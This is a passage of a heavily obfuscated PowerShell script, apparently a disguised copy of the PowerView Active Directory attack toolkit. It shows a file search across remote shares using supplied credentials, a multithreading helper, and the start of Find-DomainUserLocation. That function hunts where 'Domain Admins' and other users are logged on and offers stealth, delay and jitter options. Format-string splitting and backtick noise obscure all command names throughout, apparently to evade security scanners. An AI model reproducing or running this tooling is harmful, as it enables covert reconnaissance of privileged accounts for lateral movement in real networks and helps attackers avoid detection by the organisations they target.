            if ((${taRg`E`TpATh} -Match ((("{1}{3}{4}{0}{6}{2}{5}" -f 'Y.*NnYN','NnYNnYN','Y.','n','YNn','*','n'))-crEplaCe'NnY',[char]92)) -and (${Ps`BOunDP`AR`Ame`TERs}[("{0}{1}{2}"-f 'Cre','dent','ial')])) {
                ${H`o`Stcom`PU`Ter} = (&("{0}{1}{2}"-f'Ne','w','-Object') ("{0}{3}{2}{1}" -f'S','.Uri','em','yst')(${TaRG`EtP`ATh}))."h`OST"
                if (-not ${m`APpED`Co`m`putErs}[${hos`T`cOM`p`Uter}]) {
                    
                    &("{4}{2}{3}{5}{1}{0}{6}" -f'ti','nec','d-R','emoteCo','Ad','n','on') -ComputerName ${hostc`OM`pUT`er} -Credential ${crED`enTi`Al}
                    ${M`APPeDCOmpU`T`e`Rs}[${ho`STcomPuT`er}] = ${T`RuE}
                }
            }

            ${SEARC`HErARg`UmEN`Ts}[("{1}{0}"-f 'th','Pa')] = ${targE`TP`Ath}
            &("{1}{3}{2}{0}" -f'hildItem','Ge','-C','t') @SearcherArguments | &("{1}{3}{0}{2}" -f'j','ForEach','ect','-Ob') {
                
                ${c`ONTi`NuE} = ${T`RuE}
                if (${PsBO`UNdpA`Ra`mete`Rs}[("{0}{1}{2}" -f'Exclu','deFolder','s')] -and (${_}."PSiscO`Nt`AIN`eR")) {
                    &("{1}{3}{2}{0}" -f'bose','Write-','er','V') "Excluding: $($_.FullName) "
                    ${c`on`TiNUE} = ${FA`lSe}
                }
                if (${LAS`Tac`c`EsSTImE} -and (${_}."LAsTacC`Ess`Ti`mE" -lt ${LAs`Ta`CCESst`iME})) {
                    ${C`onti`Nue} = ${FaL`SE}
                }
                if (${PSbOuN`dpa`R`AME`TERs}[("{1}{0}{2}"-f 'Writ','Last','eTime')] -and (${_}."lAstwrITE`T`imE" -lt ${lA`STwri`T`eTI`me})) {
                    ${Cont`iN`Ue} = ${fA`lsE}
                }
                if (${pSBO`U`NdparaMET`e`Rs}[("{0}{2}{1}{3}"-f 'Cr','ti','ea','onTime')] -and (${_}."CrEAtIoN`Ti`mE" -lt ${CRE`AtIONT`ime})) {
                    ${coNT`in`UE} = ${fA`l`sE}
                }
                if (${psbounDpArA`m`eTE`RS}[("{3}{0}{1}{2}"-f 'eAc','ces','s','CheckWrit')] -and (-not (&("{2}{1}{0}"-f'te','ri','Test-W') -Path ${_}."f`U`llnamE"))) {
                    ${cont`inue} = ${FaL`Se}
                }
                if (${C`ONtiNUe}) {
                    ${f`I`leP`ArAMs} = @{
                        ("{0}{1}" -f 'Pat','h') = ${_}."F`ULLnaMe"
                        ("{1}{0}" -f 'er','Own') = $((&("{0}{1}"-f 'Get-','Acl') ${_}."FuLL`Na`ME")."Ow`Ner")
                        ("{3}{2}{4}{0}{1}" -f'essTi','me','s','La','tAcc') = ${_}."L`AS`TAcCEs`sTIme"
                        ("{2}{1}{3}{0}" -f'eTime','W','Last','rit') = ${_}."la`STw`R`iteTime"
                        ("{1}{2}{0}"-f'nTime','C','reatio') = ${_}."cRE`AtION`TI`mE"
                        ("{1}{0}" -f 'th','Leng') = ${_}."l`enG`TH"
                    }
                    ${Foun`dF`ile} = &("{1}{0}{2}" -f'-Ob','New','ject') -TypeName ("{1}{0}"-f 'Object','PS') -Property ${F`ILe`p`ARaMS}
                    ${FOu`NdFi`LE}."pS`o`BJECT"."T`YPeNAM`ES".("{1}{0}" -f 'rt','Inse').Invoke(0, ("{4}{0}{3}{2}{1}"-f'erVi','le','.FoundFi','ew','Pow'))
                    ${FO`Un`dFile}
                }
            }
        }
    }

    END {
        
        ${mapP`eD`c`OM`PUters}."k`eys" | &("{3}{4}{1}{2}{0}{5}"-f 'cti','e','moteConne','Rem','ove-R','on')
    }
}








function nEw-THRe`AD`e`dfu`NCTion {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{3}{7}{1}{6}{4}{2}{8}{0}" -f'ns','rSt','unct','UseShouldProces','hangingF','PS','ateC','sFo','io'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(posItIoN = 0, maNdatOry = ${tR`UE}, VAlUEFrOMpiPeLiNE = ${Tr`UE}, VAluEfroMpiPelINeBYproPertYnamE = ${T`RUe})]
        [String[]]
        ${Co`m`PUT`e`RNamE},

        [Parameter(POSITioN = 1, maNdAtOrY = ${tr`Ue})]
        [System.Management.Automation.ScriptBlock]
        ${S`cRIp`TBLock},

        [Parameter(PosiTIOn = 2)]
        [Hashtable]
        ${scR`IPT`paR`Am`EtERs},

        [Int]
        [ValidateRange(1,  100)]
        ${th`REa`ds} = 20,

        [Switch]
        ${nOiMPo`R`TS}
    )

    BEGIN {
        
        
        ${SE`Ss`IonST`AtE} =  $PzL::("{4}{1}{3}{2}{0}"-f'ault','reate','f','De','C').Invoke()

        
        
        ${SEssIO`NSta`TE}."ApArT`m`ENTsTATE" =   (  GET-ItEM  VAriAble:vRLM).value::"S`TA"

        
        
        if (-not ${NOI`mP`oRtS}) {
            
            ${M`yvARS} = &("{2}{1}{0}" -f'-Variable','et','G') -Scope 2

            
            ${vORb`IddEN`V`Ars} = @('?',("{0}{1}"-f'arg','s'),("{0}{2}{3}{1}" -f'Co','me','n','soleFileNa'),("{1}{0}" -f 'ror','Er'),("{0}{2}{3}{1}{4}"-f'Exec','ontex','u','tionC','t'),("{0}{1}" -f 'f','alse'),("{0}{1}" -f'HOM','E'),("{1}{0}" -f 'st','Ho'),("{0}{1}"-f'i','nput'),("{3}{2}{0}{1}"-f 'utO','bject','np','I'),("{4}{3}{1}{0}{2}" -f'iasCou','umAl','nt','xim','Ma'),("{0}{2}{1}{3}" -f 'Maxi','iveC','mumDr','ount'),("{2}{1}{3}{0}{4}"-f 'ErrorC','x','Ma','imum','ount'),("{1}{2}{0}{3}" -f'imumFunctionC','M','ax','ount'),("{2}{0}{3}{1}{4}"-f'to','Cou','MaximumHis','ry','nt'),("{4}{1}{2}{3}{0}"-f 't','mumV','a','riableCoun','Maxi'),("{0}{2}{1}"-f 'M','n','yInvocatio'),("{1}{0}" -f'ull','n'),'PID',("{3}{1}{4}{0}{2}"-f 'meter','nd','s','PSBou','Para'),("{2}{0}{1}" -f 'SCommand','Path','P'),("{0}{1}{2}" -f'PSCu','lt','ure'),("{3}{2}{1}{4}{0}"-f 'rValues','ultParam','SDefa','P','ete'),("{1}{0}" -f 'ME','PSHO'),("{0}{2}{1}"-f'PSScript','oot','R'),("{2}{0}{1}" -f'ultur','e','PSUIC'),("{2}{1}{0}{3}" -f 'ionTabl','ers','PSV','e'),'PWD',("{1}{0}"-f 'ellId','Sh'),("{1}{2}{0}{3}" -f'iz','Sync','hron','edHash'),("{0}{1}" -f 'tru','e'))

            
            ForEach (${v`Ar} in ${my`VArS}) {
                if (${V`O`RbIDdE`NvArS} -NotContains ${V`Ar}."Na`Me") {
                ${S`e`sSiONs`T`ATe}."VA`RIA`BlEs".("{1}{0}" -f'd','Ad').Invoke((&("{1}{2}{0}" -f'ct','New-Obj','e') -TypeName ("{17}{4}{14}{13}{0}{3}{10}{12}{11}{7}{8}{15}{16}{2}{1}{6}{9}{5}"-f 'gemen','l','b','t.Auto','ste','ry','e','ssi','on','Ent','mation.R','aces.Se','unsp','Mana','m.','StateVa','ria','Sy') -ArgumentList ${V`AR}."N`AmE",${V`Ar}."v`AlUE",${v`Ar}."D`EScRI`ption",${V`Ar}."o`PTi`ONs",${v`Ar}."At`TRIbu`T`eS"))
                }
            }

            
            ForEach (${fu`NcT`I`oN} in (&("{0}{1}{2}" -f'Get-ChildI','te','m') ("{0}{3}{1}{2}" -f 'Fu','c','tion:','n'))) {
                ${s`essIo`N`state}."cO`MmaNDs".("{1}{0}" -f 'dd','A').Invoke((&("{1}{2}{0}"-f '-Object','Ne','w') -TypeName ("{10}{5}{4}{1}{0}{9}{6}{8}{2}{3}{11}{7}"-f'on.Run','ent.Automati','tio','nE','anagem','M','Fun','y','c','spaces.SessionState','System.','ntr') -ArgumentList ${Fu`NctIon}."n`AME", ${fu`NcTI`on}."DefIn`I`TIon"))
            }
        }

        
        
        

        
        ${P`Ool} =   (Gi  ("vARIa"+"BLE:"+"pr487") ).VALUe::("{5}{0}{4}{1}{2}{3}"-f 'r','ateRunspaceP','oo','l','e','C').Invoke(1, ${thRea`dS}, ${SEs`sIoN`sTa`TE}, ${h`osT})
        ${p`oOL}.("{1}{0}"-f'n','Ope').Invoke()

        
        ${M`eth`oD} = ${nu`Ll}
        ForEach (${m} in  $l69.("{2}{0}{3}{1}"-f 'tMe','s','Ge','thod').Invoke() | &("{3}{0}{1}{2}" -f 'ere-Ob','je','ct','Wh') { ${_}."N`AmE" -eq ("{1}{0}{2}"-f 'ok','BeginInv','e') }) {
            ${m`EThoD`pA`RaMe`TE`Rs} = ${M}.("{0}{4}{1}{2}{3}" -f 'G','ar','ame','ters','etP').Invoke()
            if ((${meThoDP`AR`AMeTE`RS}."CO`UNt" -eq 2) -and ${MeTh`o`DP`AraMETERS}[0]."nA`mE" -eq ("{1}{0}" -f 'nput','i') -and ${meT`Hod`par`Am`eTERS}[1]."Na`Me" -eq ("{0}{1}" -f 'out','put')) {
                ${m`ethOd} = ${m}."m`A`kEgE`N`eRic`mEthOd"([Object], [Object])
                break
            }
        }

        ${J`obs} = @()
        ${c`OmpuTe`R`Name} = ${COM`pUTER`N`Ame} | &("{2}{1}{3}{0}" -f't','here','W','-Objec') {${_} -and ${_}.("{1}{0}" -f 'm','Tri').Invoke()}
        &("{3}{2}{0}{1}" -f 'Ve','rbose','ite-','Wr') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if (${tHRe`A`dS} -ge ${coMpU`TEr`NA`mE}."lE`NgTh") {
            ${tH`REA`ds} = ${co`MpuTe`RnAme}."leN`G`Th"
        }
        ${eLEmEn`T`S`P`LitsIzE} = [Int](${Co`m`PUtErnAmE}."L`e`NgtH"/${tHrE`A`DS})
        ${cOmp`UT`ERn`A`MePArTITIOn`ED} = @()
        ${s`Ta`Rt} = 0
        ${E`Nd} = ${ElE`MENT`sPLitS`I`ze}

        for(${I} = 1; ${i} -le ${tHrEA`ds}; ${I}++) {
            ${L`isT} = &("{0}{2}{1}"-f 'Ne','ct','w-Obje') ("{5}{0}{4}{1}{3}{2}"-f'l','ns.Ar','yList','ra','lectio','System.Co')
            if (${i} -eq ${ThRE`AdS}) {
                ${E`Nd} = ${c`Omp`UT`ErnAMe}."Len`GTh"
            }
            ${l`ist}."addran`ge"(${c`omP`UT`ERN`AmE}[${s`T`Art}..(${e`Nd}-1)])
            ${S`TA`RT} += ${Ele`mEN`Tsp`LItSIze}
            ${e`Nd} += ${ELeMeN`TS`PLIt`SI`zE}
            ${C`O`MpUTErNaMe`PART`ITIONED} += @(,@(${L`IsT}.("{1}{0}"-f'ay','ToArr').Invoke()))
        }

        &("{0}{1}{2}" -f'Write-','V','erbose') ('[Ne'+'w-'+'Thr'+'ea'+'d'+'edF'+'uncti'+'on] '+'T'+'otal '+'n'+'um'+'ber '+'o'+'f '+'thre'+'ads'+'/part'+'i'+'t'+'i'+'ons: '+"$Threads")

        ForEach (${Co`mpUTE`Rna`mepAr`TITIon} in ${cOmpUt`e`RnAMep`AR`Ti`TIO`NED}) {
            
            ${p`OwE`RSHE`Ll} =  $L69::("{0}{1}"-f'Creat','e').Invoke()
            ${P`OwE`RsHe`lL}."ru`Ns`PAc`EpOoL" = ${p`oOL}

            
            ${N`UlL} = ${powER`s`heLL}.("{2}{0}{1}" -f'S','cript','Add').Invoke(${SCripT`Bl`O`cK}).("{0}{2}{1}"-f'A','dParameter','d').Invoke(("{1}{2}{0}" -f 'e','Comp','uterNam'), ${c`o`Mpu`T`E`RnaM`EpaRTItIoN})
            if (${SCr`iP`TpARaME`TeRs}) {
                ForEach (${pA`RaM} in ${S`Cr`IpTPar`Ame`TERs}.("{1}{2}{0}"-f'umerator','G','etEn').Invoke()) {
                    ${nu`lL} = ${pO`We`R`ShELL}.("{0}{2}{3}{1}" -f 'Add','eter','Pa','ram').Invoke(${P`Ar`Am}."n`AME", ${P`AR`AM}."v`ALUE")
                }
            }

            
            ${ou`TP`Ut} = &("{0}{1}{2}"-f'New-Ob','je','ct') ("{6}{5}{8}{11}{12}{9}{0}{10}{2}{1}{4}{3}{7}" -f 'SDa','ct','le','on[Objec','i','ment.Aut','Manage','t]','om','n.P','taCol','at','io')

            
            ${j`obs} += @{
                ('PS') = ${p`owe`R`SheLl}
                ("{0}{1}" -f'Outpu','t') = ${oU`TP`UT}
                ("{0}{1}"-f 'Re','sult') = ${MeT`H`od}."in`VOkE"(${pOwERSh`E`lL}, @(${n`ULl}, [Management.Automation.PSDataCollection[Object]]${O`UtpuT}))
            }
        }
    }

    END {
        &("{3}{1}{0}{2}"-f'-Verbo','ite','se','Wr') ("{2}{3}{6}{0}{4}{5}{1}" -f'dedFunct','hreads executing','[New','-','i','on] T','Threa')

        
        Do {
            ForEach (${j`OB} in ${J`oBS}) {
                ${J`oB}."oUTP`UT".("{0}{2}{1}" -f 'Re','All','ad').Invoke()
            }
            &("{2}{0}{1}"-f'l','eep','Start-S') -Seconds 1
        }
        While ((${J`ObS} | &("{0}{1}{2}" -f'Wher','e-','Object') { -not ${_}."r`EsuLt"."IsC`OMPl`eTED" })."cO`Unt" -gt 0)

        ${s`Le`EPs`eco`NDS} = 100
        &("{1}{4}{0}{2}{3}"-f'e','Writ','rbos','e','e-V') ('[N'+'ew-T'+'hre'+'adedFu'+'nc'+'tion]'+' '+'Wai'+'ti'+'ng '+"$SleepSeconds "+'secon'+'ds'+' '+'for'+' '+'f'+'in'+'al '+'c'+'leanup.'+'..')

        
        for (${I}=0; ${I} -lt ${S`Lee`ps`econDS}; ${i}++) {
            ForEach (${j`oB} in ${jo`BS}) {
                ${j`ob}."o`UTPUt".("{1}{0}"-f 'eadAll','R').Invoke()
                ${j`Ob}."P`s".("{0}{1}{2}"-f 'Di','spo','se').Invoke()
            }
            &("{1}{0}{2}"-f 'rt-','Sta','Sleep') -S 1
        }

        ${Po`Ol}.("{0}{2}{1}"-f'D','se','ispo').Invoke()
        &("{0}{2}{1}"-f 'W','bose','rite-Ver') ("{6}{4}{1}{7}{2}{3}{5}{8}{9}{0}"-f ' completed','hreade','u','nctio','New-T','n] a','[','dF','ll th','reads')
    }
}


function fINd`-`DoMaINuSEr`lOCa`TI`ON {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f'ouldProce','P','SSh','ss'}, '')]
    [OutputType({"{4}{5}{0}{2}{1}{3}" -f'rLoc','o','ati','n','Power','View.Use'})]
    [CmdletBinding(DEFaULtpArAMeTERsetNamE = {"{0}{1}{3}{2}"-f 'UserGroupId','ent','y','it'})]
    Param(
        [Parameter(POsITiOn = 0, VALuEfrOMpIPeLinE = ${t`RuE}, vAlUefRomPiPELINEBYproPertYnAME = ${t`Rue})]
        [Alias({"{0}{1}{2}" -f 'D','NSHostN','ame'})]
        [String[]]
        ${cOmPUTe`RNA`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`om`AIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`omPu`TE`R`DoMAIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${compU`Ter`LdAP`FiLTER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${C`OmPUTErs`EArcHbA`Se},

        [Alias({"{0}{3}{1}{2}" -f 'U','strai','ned','ncon'})]
        [Switch]
        ${Co`m`p`UTeR`UnCoN`St`RAiNeD},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}" -f 'S','Operating','yste','m'})]
        [String]
        ${c`oMp`U`TeROperAT`ingSYs`T`EM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}"-f'vi','Ser','ack','ceP'})]
        [String]
        ${COmP`U`T`erSERvI`CePAck},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'Name','Site'})]
        [String]
        ${cOMpUt`ersI`T`ENAME},

        [Parameter(pARAMEterSETnaME = "UsERiD`EN`TI`Ty")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${U`sE`RI`dEnTI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${US`E`RDoMaIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${u`sERLdapfI`lTER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USeRse`ArC`HBase},

        [Parameter(pArametersETnaMe = "UsEr`grOUPIDE`N`TI`TY")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'pName','u','Gro'}, {"{1}{0}" -f 'p','Grou'})]
        [String[]]
        ${userGrO`U`piDEnT`ity} = ("{1}{2}{0}" -f'ns','Domain ','Admi'),

        [Alias({"{2}{1}{0}" -f'Count','n','Admi'})]
        [Switch]
        ${USErADm`iNc`o`U`NT},

        [Alias({"{1}{0}{4}{2}{3}"-f 'llowDel','A','ati','on','eg'})]
        [Switch]
        ${u`ser`AlloW`delE`GatIOn},

        [Switch]
        ${c`hECKaCCE`Ss},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}"-f 'olle','r','r','DomainCont'})]
        [String]
        ${S`E`RVeR},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{1}{2}{0}"-f'l','OneLev','e'}, {"{1}{0}"-f'btree','Su'})]
        [String]
        ${s`eA`RcHSCOPe} = ("{0}{1}"-f'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESUltP`Ag`es`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`Erv`E`RtIM`elImIT},

        [Switch]
        ${TOm`BS`T`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`deNTI`AL} =   $21gV7e::"E`MpTY",

        [Switch]
        ${stO`Ponsucc`eSS},

        [ValidateRange(1, 10000)]
        [Int]
        ${d`El`AY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JiT`TER} = .3,

        [Parameter(PaRAmetERsEtnAME = "sh`O`Wall")]
        [Switch]
        ${S`hOwALl},

        [Switch]
        ${St`e`ALTH},

        [String]
        [ValidateSet('DFS', 'DC', {"{1}{0}" -f'le','Fi'}, 'All')]
        ${ste`ALtHsour`cE} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${T`hr`EaDS} = 20
    )

    BEGIN {

        ${COm`Pu`TeRsearChE`RARGuMe`NtS} = @{
            ("{0}{2}{1}"-f'Prope','ies','rt') = ("{2}{0}{1}"-f'tnam','e','dnshos')
        }
        if (${psbOU`NDPAR`AM`eT`e`Rs}[("{0}{1}"-f 'Doma','in')]) { ${cOM`PU`TerSEARC`he`RArgumEN`Ts}[("{1}{0}" -f 'in','Doma')] = ${DOM`Ain} }
        if (${PsboUnDPar`A`M`eterS}[("{3}{1}{2}{0}{4}"-f'r','put','e','Com','Domain')]) { ${CoMP`U`TER`SEArCH`Era`R`GUmen`Ts}[("{0}{1}{2}"-f'Do','m','ain')] = ${C`OmPut`E`RD`OMaiN} }
        if (${PsBOU`N`dpARAME`TE`Rs}[("{2}{1}{0}{3}{4}" -f'L','omputer','C','DAPFi','lter')]) { ${cOMputE`R`SeaRCHE`RaRG`U`mENts}[("{1}{2}{0}"-f'er','LDAP','Filt')] = ${cO`M`putErl`daPfiLTER} }
        if (${PS`B`OUNdparAME`TeRS}[("{2}{4}{3}{1}{0}" -f 'se','rchBa','ComputerS','a','e')]) { ${Co`M`pUTeRSEaR`chE`R`ARGuM`ENTs}[("{2}{1}{0}" -f'e','hBas','Searc')] = ${cOm`PUt`Er`seArCH`BAse} }
        if (${ps`BoUNDPA`Rame`TeRS}[("{1}{2}{0}{3}{4}"-f'r','Uncon','st','ain','ed')]) { ${com`pUteRS`ear`cH`ER`ARguMEnts}[("{3}{0}{1}{2}{4}"-f't','r','aine','Uncons','d')] = ${u`NCO`NsTR`Ained} }
        if (${psbOU`NDpa`RAMe`T`ERS}[("{4}{1}{0}{2}{3}" -f 'terOpe','ompu','ratingSy','stem','C')]) { ${c`OmP`U`TEr`Sea`RCH`ERaRGuMEnts}[("{3}{4}{1}{0}{2}" -f'gS','eratin','ystem','O','p')] = ${O`PE`RA`TInGsYstEM} }
        if (${PSbO`UnDpA`RA`met`eRS}[("{5}{4}{1}{0}{3}{2}" -f'rv','e','cePack','i','omputerS','C')]) { ${COmP`Ut`E`R`Sear`ChER`A`RGUmentS}[("{0}{2}{1}"-f 'ServiceP','ck','a')] = ${sERViC`E`Pa`ck} }
        if (${P`sboUNDPA`RAM`etErS}[("{4}{1}{0}{3}{2}"-f 'puterSiteN','m','e','am','Co')]) { ${COmpu`TE`R`SEarchera`R`gu`m`ents}[("{0}{2}{1}"-f'SiteNa','e','m')] = ${s`It`ENaME} }
        if (${pSbo`UND`P`ArAmE`T`ERS}[("{1}{0}" -f'er','Serv')]) { ${cO`M`puTe`RsEA`R`cHE`RArGuM`EN`Ts}[("{0}{2}{1}"-f 'S','r','erve')] = ${Se`R`Ver} }
        if (${PS`BOU`NDpA`Ra`METERS}[("{1}{0}{2}" -f'rchScop','Sea','e')]) { ${CoMP`UTe`RsEaRC`h`eRAR`G`UMEntS}[("{0}{2}{1}" -f'Sea','chScope','r')] = ${sEA`RChs`cOPe} }
        if (${psb`OU`Nd`pa`RaMeteRS}[("{0}{1}{2}" -f'Result','PageS','ize')]) { ${coMPu`TEr`sEArCher`ARgum`En`TS}[("{2}{3}{1}{0}{4}"-f 'g','ltPa','Re','su','eSize')] = ${Re`S`UlTpaG`ESIZE} }
        if (${pSbou`N`DP`Ar`AMeterS}[("{1}{2}{0}{3}"-f 'r','Ser','ve','TimeLimit')]) { ${C`oMput`erS`e`ARCHerARG`UM`E`NtS}[("{0}{3}{1}{2}"-f 'Se','imeL','imit','rverT')] = ${SE`R`VERtiME`L`i`miT} }
        if (${PS`BO`UnDpA`RAMeters}[("{0}{3}{1}{2}" -f 'To','ton','e','mbs')]) { ${Co`M`put`ErSE`ARc`her`ArGUM`eNTs}[("{2}{1}{0}" -f'ne','o','Tombst')] = ${tO`Mbs`ToNE} }
        if (${psB`OUnDPa`R`AM`eTERS}[("{2}{0}{1}" -f'ntia','l','Crede')]) { ${com`PUt`ErS`EARCheRARgUM`E`NTS}[("{2}{0}{1}" -f'den','tial','Cre')] = ${Creden`T`iAl} }

        ${use`RsEARchera`RgUm`EN`Ts} = @{
            ("{2}{1}{0}"-f'operties','r','P') = ("{2}{4}{0}{3}{1}"-f'ou','ame','sama','ntn','cc')
        }
        if (${PSBOUND`P`ARAmEt`ERS}[("{0}{1}{2}"-f'UserIde','ntit','y')]) { ${usErs`eArcHe`RArG`UMENTs}[("{0}{1}{2}"-f'I','dent','ity')] = ${U`se`RidentITY} }
        if (${PSB`Ou`NdPAra`METERs}[("{2}{1}{0}"-f'in','a','Dom')]) { ${usER`s`earcHERa`R`gUmenTS}[("{1}{0}"-f 'main','Do')] = ${D`omAiN} }
        if (${P`sbOu`NdPar`Am`EteRs}[("{1}{2}{0}" -f'omain','U','serD')]) { ${uSeRS`EarChe`Ra`RgU`mE`NTs}[("{0}{1}"-f'Do','main')] = ${uSE`RdOm`Ain} }
        if (${P`sBO`UNDPA`RA`m`ETeRS}[("{1}{2}{0}" -f 'PFilter','UserL','DA')]) { ${USER`sea`Rc`HeRAR`gUM`eN`Ts}[("{2}{0}{1}"-f 'i','lter','LDAPF')] = ${uSerl`d`A`PFIlteR} }
        if (${psBOu`NDPA`RA`meTErS}[("{3}{0}{2}{1}{4}" -f'rSear','B','ch','Use','ase')]) { ${U`sers`eArcH`ErARgUMen`TS}[("{2}{1}{0}"-f 'Base','earch','S')] = ${UsERS`e`AR`chbAsE} }
        if (${p`sbOun`DP`ArAMeT`ers}[("{2}{4}{3}{0}{1}"-f 'nC','ount','UserA','i','dm')]) { ${uSERs`EaR`CHe`R`ArGUm`en`Ts}[("{0}{1}{2}" -f 'A','dm','inCount')] = ${U`SerA`dM`iNCounT} }
        if (${pSbOuNdp`ARaME`TE`Rs}[("{3}{0}{1}{2}{4}"-f'serA','l','lo','U','wDelegation')]) { ${USERsEa`RcHE`RArGUM`eN`Ts}[("{0}{2}{4}{1}{3}" -f'A','owDelegati','l','on','l')] = ${Us`erALLoW`d`ele`Ga`Ti`ON} }
        if (${pS`Bou`N`dP`AR`AMETERS}[("{1}{0}" -f 'erver','S')]) { ${uSERS`eARcH`eRar`G`U`mE`NTs}[("{1}{0}"-f 'er','Serv')] = ${ser`VER} }
        if (${p`SBou`NdP`ArAmeteRS}[("{1}{0}{2}{3}" -f 'archS','Se','c','ope')]) { ${u`serSe`ARCheRA`RGuM`Ents}[("{1}{0}{2}" -f'rchSco','Sea','pe')] = ${S`E`ARCHS`CoPE} }
        if (${p`sbOU`N`DpaRaMET`erS}[("{4}{0}{1}{2}{3}"-f 'sult','P','age','Size','Re')]) { ${Us`erSEarCh`er`ARgUMe`NTS}[("{1}{2}{0}{3}" -f'eSiz','R','esultPag','e')] = ${resULTPAG`e`SIZe} }
        if (${Ps`Boun`d`PA`R`AmetERs}[("{2}{0}{3}{1}"-f 'Li','it','ServerTime','m')]) { ${uS`ERSEA`R`ChERar`gume`NTS}[("{0}{2}{3}{1}"-f 'Server','t','TimeLim','i')] = ${SeR`VE`RtI`m`ELiMit} }
        if (${pSbOu`NDP`ARame`TERS}[("{1}{2}{0}" -f 'tone','T','ombs')]) { ${USE`RSEarCHE`R`ARG`Um`Ents}[("{1}{0}{2}" -f'bs','Tom','tone')] = ${TO`MB`sTone} }
        if (${pSb`o`UnDpA`RAMETERs}[("{1}{2}{0}" -f 'tial','Cred','en')]) { ${us`erS`EArC`hErar`gum`EntS}[("{1}{0}{2}" -f'edentia','Cr','l')] = ${CRe`D`E`NTIAl} }

        ${taRGE`Tc`OM`pUteRS} = @()

        
        if (${p`s`BouNdP`ArameT`e`RS}[("{0}{1}{3}{2}" -f'Compu','t','me','erNa')]) {
            ${tAr`Ge`TC`O`MPUTe`Rs} = @(${COmpu`T`E`RnAmE})
        }
        else {
            if (${PSb`ou`Nd`PAramET`ers}[("{0}{2}{1}"-f'Stea','h','lt')]) {
                &("{2}{1}{0}"-f 'bose','ite-Ver','Wr') ('[F'+'in'+'d-Domai'+'nUser'+'Lo'+'ca'+'tion] '+'S'+'tea'+'lth '+'e'+'num'+'eration '+'us'+'ing '+'sourc'+'e: '+"$StealthSource")
                ${Tar`GetcO`mputER`ARrAyLI`sT} = &("{0}{2}{1}"-f'Ne','bject','w-O') ("{1}{5}{2}{7}{0}{6}{3}{4}"-f '.','Syst','.','ra','yList','em','Ar','Collections')

                if (${St`E`Al`THSourCE} -match ((("{2}{1}{0}" -f'll','A','File{0}')) -f  [ChAR]124)) {
                    &("{0}{1}{2}{3}" -f'Write-Ver','b','o','se') ("{12}{2}{8}{7}{0}{6}{10}{4}{9}{11}{1}{5}{3}"-f'cat',' ','Fi','vers','ing ','ser','ion] Q','inUserLo','nd-Doma','for f','uery','ile','[')
                    ${fI`LESeRveRsE`Ar`cHERA`Rg`UMEnts} = @{}
                    if (${psB`OU`NDPa`RamETerS}[("{0}{1}" -f'Dom','ain')]) { ${fi`LESeR`V`eRSEARCHE`RA`RgumeN`Ts}[("{2}{0}{1}"-f'a','in','Dom')] = ${dOMA`In} }
                    if (${P`SBoU`NDpAR`AmEt`E`RS}[("{0}{1}{3}{2}" -f'Comput','erDo','ain','m')]) { ${fI`LeSEr`V`erSeaRche`R`Arg`UmENtS}[("{0}{1}"-f'Domai','n')] = ${C`omPUt`ERd`O`mAiN} }
                    if (${pSBo`UNdPA`R`AMEtERs}[("{0}{2}{3}{4}{5}{1}"-f'Comp','se','uter','S','earch','Ba')]) { ${fIle`ServE`Rsea`RChErar`Gu`mentS}[("{0}{1}{2}"-f 'SearchBa','s','e')] = ${coMpuTeR`SEARC`hB`AsE} }
                    if (${PSBoU`NdpArAM`eT`ErS}[("{2}{0}{1}"-f 'e','rver','S')]) { ${fIleSEr`V`ERs`ear`C`HeR`A`RgU`mENts}[("{0}{1}{2}"-f 'Serv','e','r')] = ${SER`VEr} }
                    if (${p`Sbo`UNd`P`ARa`mETErS}[("{2}{0}{1}{3}"-f 'earchSc','o','S','pe')]) { ${FiLe`Se`R`Vers`EaRcheR`AR`g`UMENtS}[("{1}{2}{0}" -f'Scope','Sea','rch')] = ${sE`Ar`ch`sCoPe} }
                    if (${psBoUNd`Pa`RamET`eRs}[("{0}{2}{1}{3}" -f 'Result','age','P','Size')]) { ${F`IL`EservErs`eArcHERArGU`M`enTS}[("{3}{2}{4}{0}{1}"-f 'g','eSize','e','R','sultPa')] = ${resUlTp`A`g`ESI`ze} }
                    if (${P`SBoUnDPAR`AmET`ERs}[("{2}{0}{1}{3}" -f 'er','TimeLim','Serv','it')]) { ${FileSEr`V`erseaR`C`HERa`Rg`UMeNTs}[("{0}{2}{1}{3}"-f 'Serve','eLimi','rTim','t')] = ${sEr`VEr`Ti`M`eliMIT} }
                    if (${P`sbo`UNdp`A`RAMETerS}[("{0}{1}{2}"-f'Tom','bst','one')]) { ${fIle`sE`Rver`SEArC`HE`R`ARGuMe`NtS}[("{1}{0}{2}" -f'bsto','Tom','ne')] = ${TOm`Bs`TO`Ne} }
                    if (${p`SbOU`Ndp`Ar`AM`ETErs}[("{2}{1}{0}" -f 'tial','eden','Cr')]) { ${f`iles`e`R`VeRsEAR`CHE`Ra`Rg`UmeNTs}[("{1}{0}{2}"-f're','C','dential')] = ${C`R`eDen`TIAl} }
